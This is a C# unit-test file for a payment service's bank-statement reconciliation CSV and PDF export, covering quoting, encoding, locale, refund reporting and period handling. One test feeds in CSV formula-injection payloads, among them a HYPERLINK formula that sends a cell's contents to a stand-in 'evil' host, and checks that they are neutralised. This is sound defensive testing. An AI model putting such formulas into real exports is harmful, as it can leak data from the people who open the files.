using System.Globalization;
using System.Text;
using FluentAssertions;
using FuelFlow.Features.Acquiring;
using FuelFlow.Features.Acquiring.Reconciliation;
using FuelFlow.Features.Orders.SharedModels;
using FuelFlow.SharedKernel.Options;
using FuelFlow.Testing;
using Xunit;

namespace FuelFlow.UnitTests.Acquiring;

public class StatementReconciliationDocumentTests
{
    private static StatementReconciliationResponse Act()
    {
        var rows = new List<StatementMatchRow>
        {
            new("ST1", StatementMatchStatus.Matched, "INV1", "FuelFlow Order x", "оплата за пальне",
                97857, 978.57m,
                Guid.NewGuid(), 978.57m, "ord-1", OrderStatus.Fulfilled,
                new DateTime(2026, 10, 5, 9, 0, 0, DateTimeKind.Utc), null),
            new("ST2", StatementMatchStatus.AmountMismatch, "INV2", "FuelFlow Bundle", "оплата за пальне",
                97900, 979.00m,
                Guid.NewGuid(), 978.57m, "ord-2", OrderStatus.Fulfilled,
                new DateTime(2026, 10, 6, 9, 0, 0, DateTimeKind.Utc),
                "Acquirer reports 979.00, the order was priced 978.57"),
            new("ST3", StatementMatchStatus.Unmatched, "INV3", null, null,
                25000, 250.00m,
                null, null, null, null,
                new DateTime(2026, 10, 7, 9, 0, 0, DateTimeKind.Utc),
                "No order or refund of ours carries this invoice")
        };

        return new StatementReconciliationResponse(
            MonobankMerchant.Live,
            new DateTime(2026, 10, 1, 0, 0, 0, DateTimeKind.Utc),
            new DateTime(2026, 11, 1, 0, 0, 0, DateTimeKind.Utc),
            3,
            StatementMatcher.Summarise(rows, Refunds()),
            rows,
            [new MissingFromStatementRow(Guid.NewGuid(), "INV9", 100m, OrderStatus.PendingFulfillment, TestClock.UtcNow)],
            Refunds());
    }

    /// <summary>
    /// The refunds the act reports from our side: one of them reverses a payment from an earlier
    /// period, which is the case the act has to mark rather than net away.
    /// </summary>
    private static IReadOnlyList<IssuedRefundRow> Refunds() =>
    [
        new IssuedRefundRow(
            Guid.NewGuid(), Guid.NewGuid(), "INV1", 478.57m,
            new DateTime(2026, 10, 8, 12, 0, 0, DateTimeKind.Utc),
            new DateTime(2026, 10, 3, 9, 0, 0, DateTimeKind.Utc),
            false,
            null),
        new IssuedRefundRow(
            Guid.NewGuid(), Guid.NewGuid(), "INV2", 250m,
            new DateTime(2026, 10, 20, 12, 0, 0, DateTimeKind.Utc),
            new DateTime(2026, 9, 20, 9, 0, 0, DateTimeKind.Utc),
            true,
            "Reverses a payment from 2026-09-20 - an earlier period than this act")
    ];

    [Fact]
    public void The_Csv_Carries_One_Line_Per_Row_Plus_A_Summary()
    {
        var csv = StatementReconciliationCsv.Render(Act());

        csv.Should().Contain("Matched,1");
        csv.Should().Contain("Amount mismatches,1");
        csv.Should().Contain("Unmatched,1");
        csv.Should().Contain("ST1");
        csv.Should().Contain("ST2");
        csv.Should().Contain("ST3");
        csv.Should().Contain("INV9");
    }

    [Fact]
    public void The_Csv_Shows_The_Destination_Beside_The_Reference()
    {
        // The acquirer's `destination` is the payment purpose as it appears on the receipt - the
        // only human-readable string on the row, and the one an accountant reads when a customer
        // says they paid for something else. It sits BESIDE our own echoed reference, which is what
        // ties the row to our invoice; it never replaces it, and it is never a match key.
        var csv = StatementReconciliationCsv.Render(Act());

        csv.Should().Contain("StatementId,Status,InvoiceId,Reference,Destination,");
        csv.Should().Contain("оплата за пальне");
    }

    [Fact]
    public void The_Csv_Carries_When_We_Saw_The_Row_And_How_Late_It_Was()
    {
        // The acquirer's timestamp says when the money moved; ours says when the import learned
        // about it. That pair is what tells a late row from a missing one, so it is in the file the
        // accountant reads, not only in the database.
        var act = Act();
        var rows = act.Rows
            .Select(r => r with
            {
                StatementSeenAtUtc = new DateTime(2026, 10, 5, 10, 35, 0, DateTimeKind.Utc),
                StatementLagMinutes = 95
            })
            .ToList();

        var csv = StatementReconciliationCsv.Render(act with { Rows = rows });

        csv.Should().Contain("StatementSeenAt,LagMinutes");
        csv.Should().Contain("\"2026-10-05 10:35:00\"");
        csv.Should().Contain("\"95\"");
    }

    [Theory]
    [InlineData("=HYPERLINK(\"http://evil/?d=\"&A1)")]
    [InlineData("+1+1")]
    [InlineData("-1+1")]
    [InlineData("@SUM(A1:A9)")]
    public void A_Cell_That_Would_Be_A_Formula_In_A_Spreadsheet_Is_Defused(string payload)
    {
        // The destination is what the customer typed, so a payer can put a formula there - and
        // this file is opened in a spreadsheet, by an accountant, on a machine that has the
        // payer's URL in it. The apostrophe is Excel's own "this is text" marker: the cell reads
        // as what the payer typed, and the spreadsheet drops the marker.
        var csv = StatementReconciliationCsv.Render(ActWithDestination(payload));

        csv.Should().Contain($"\"'{payload.Replace("\"", "\"\"")}\"");
        csv.Should().NotContain($"\"{payload.Replace("\"", "\"\"")}\"");
    }

    [Fact]
    public void A_Cell_That_Does_Not_Start_A_Formula_Is_Left_Alone()
    {
        // The defusal is a prefix, not a rewrite: a destination that says what it says must still
        // say what it says.
        var csv = StatementReconciliationCsv.Render(ActWithDestination("оплата за пальне 50 л"));

        csv.Should().Contain("\"оплата за пальне 50 л\"");
        csv.Should().NotContain("'оплата");
    }

    [Fact]
    public void A_Negative_Amount_Stays_A_Number()
    {
        // The defusal marker is Excel's "this is text" marker, and a money column the spreadsheet
        // reads as text is a column nobody can sum. A negative amount is a number, not a formula -
        // so the money is written without the marker, whatever it starts with.
        var act = Act();
        var rows = act.Rows
            .Select(r => r with { AcquirerAmount = -12.50m, LocalAmount = -12.50m })
            .ToList();

        var csv = StatementReconciliationCsv.Render(act with { Rows = rows });

        csv.Should().Contain("\"-12.50\"");
        csv.Should().NotContain("'-12.50");
    }

    /// <summary>
    /// The same act, with a payer-chosen destination.
    /// </summary>
    private static StatementReconciliationResponse ActWithDestination(string destination)
    {
        var act = Act();
        return act with
        {
            Rows = act.Rows.Select(r => r with { Destination = destination }).ToList()
        };
    }

    // The act is read in a spreadsheet, and Excel on Windows decides a CSV's encoding from the BOM
    // alone - without it the customer's Cyrillic names arrive as mojibake in the one tool this is
    // actually opened with.
    [Fact]
    public void The_Csv_Bytes_Start_With_A_Utf8_Bom()
    {
        var bytes = StatementReconciliationCsv.RenderBytes(Act());

        bytes.Take(3).Should().Equal(0xEF, 0xBB, 0xBF);
    }

    // A note containing a comma must not split into two rows; RFC 4180 doubling is what every
    // reader that matters understands.
    [Fact]
    public void The_Csv_Quotes_Every_Field_So_A_Comma_Cannot_Split_A_Row()
    {
        var csv = StatementReconciliationCsv.Render(Act());

        csv.Should().Contain("\"Acquirer reports 979.00, the order was priced 978.57\"");
    }

    [Fact]
    public void The_Csv_Writes_Decimal_Points_Whatever_The_Machine_Locale()
    {
        var original = CultureInfo.CurrentCulture;
        try
        {
            // A comma-decimal locale is how "979,00" reaches an accountant in the one document
            // whose figures must read identically everywhere.
            CultureInfo.CurrentCulture = new CultureInfo("de-DE");

            var csv = StatementReconciliationCsv.Render(Act());

            csv.Should().Contain("978.57");
            csv.Should().NotContain("978,57");
        }
        finally
        {
            CultureInfo.CurrentCulture = original;
        }
    }

    [Fact]
    public void The_Pdf_Is_A_Pdf()
    {
        var pdf = StatementReconciliationPdf.Build(Act());

        pdf.Should().NotBeEmpty();
        Encoding.ASCII.GetString(pdf, 0, 5).Should().Be("%PDF-");
    }

    [Fact]
    public void The_Pdf_Renders_An_Act_With_A_Mismatch_And_Unmatched_Rows()
    {
        // The colours and the Cyrillic labels are the point of the document; if either silently
        // fails to render, the act still "works" and nobody finds out until an accountant does.
        var pdf = StatementReconciliationPdf.Build(Act());

        pdf.Should().NotBeEmpty();
        Encoding.ASCII.GetString(pdf, 0, 5).Should().Be("%PDF-");
    }

    [Fact]
    public void An_Empty_Period_Still_Renders_Both_Formats()
    {
        var empty = Act() with
        {
            Rows = Array.Empty<StatementMatchRow>(),
            MissingFromStatement = Array.Empty<MissingFromStatementRow>(),
            RefundsIssued = Array.Empty<IssuedRefundRow>(),
            StatementRowCount = 0,
            Summary = StatementMatcher.Summarise(Array.Empty<StatementMatchRow>())
        };

        StatementReconciliationCsv.Render(empty).Should().Contain("Rows in statement,0");
        Encoding.ASCII.GetString(StatementReconciliationPdf.Build(empty), 0, 5).Should().Be("%PDF-");
    }

    // The refunds we issued in the period get their own figure, beside the matched total. The
    // matched total stays gross - netting the two would mix the periods in a signed document.
    [Fact]
    public void The_Csv_Carries_The_Refunds_We_Issued_Beside_The_Matched_Total()
    {
        var csv = StatementReconciliationCsv.Render(Act());

        csv.Should().Contain("Refunds issued in period,2");
        csv.Should().Contain("Refunds issued total UAH,728.57");
        csv.Should().Contain("Matched total UAH,978.57");
    }

    // The section names the payment each refund gives back against: the statement cannot, because a
    // reversal arrives with no invoice id of its own.
    [Fact]
    public void The_Csv_Lists_The_Refunds_With_The_Payment_They_Reverse()
    {
        var csv = StatementReconciliationCsv.Render(Act());

        csv.Should().Contain("Refunds we issued in this period");
        csv.Should().Contain("RefundId,InvoiceId,OrderId,Amount,IssuedAt,ReversedPaymentAt,Note");
        csv.Should().Contain("INV2");
        csv.Should().Contain("478.57");
        // The refund that reverses an earlier period's payment says so.
        csv.Should().Contain("Reverses a payment from 2026-09-20 - an earlier period than this act");
    }

    [Fact]
    public void The_Pdf_Renders_The_Refunds_Section()
    {
        var pdf = StatementReconciliationPdf.Build(Act());

        pdf.Should().NotBeEmpty();
        Encoding.ASCII.GetString(pdf, 0, 5).Should().Be("%PDF-");
    }

    [Theory]
    // The end is always the start of the next month, so consecutive months tile rather than
    // overlap - including across the year boundary, which is where a naive "+1 month" test case
    // silently produces month 13.
    [InlineData(2026, 10, 2026, 11)]
    [InlineData(2026, 12, 2027, 1)]
    [InlineData(2027, 1, 2027, 2)]
    public void The_Default_Period_Is_The_Calendar_Month(int year, int month, int toYear, int toMonth)
    {
        var (from, to) = GetStatementReconciliationQueryHandler.ResolvePeriod(
            new StatementReconciliationQuery { Year = year, Month = month });

        from.Should().Be(new DateTime(year, month, 1, 0, 0, 0, DateTimeKind.Utc));
        to.Should().Be(new DateTime(toYear, toMonth, 1, 0, 0, 0, DateTimeKind.Utc));
    }

    [Fact]
    public void Explicit_Bounds_Win_Over_The_Calendar_Month()
    {
        var (from, to) = GetStatementReconciliationQueryHandler.ResolvePeriod(
            new StatementReconciliationQuery
            {
                Year = 2026,
                Month = 10,
                FromUtc = new DateTime(2026, 1, 1, 0, 0, 0, DateTimeKind.Utc),
                ToUtc = new DateTime(2026, 2, 1, 0, 0, 0, DateTimeKind.Utc)
            });

        from.Month.Should().Be(1);
        to.Month.Should().Be(2);
    }
}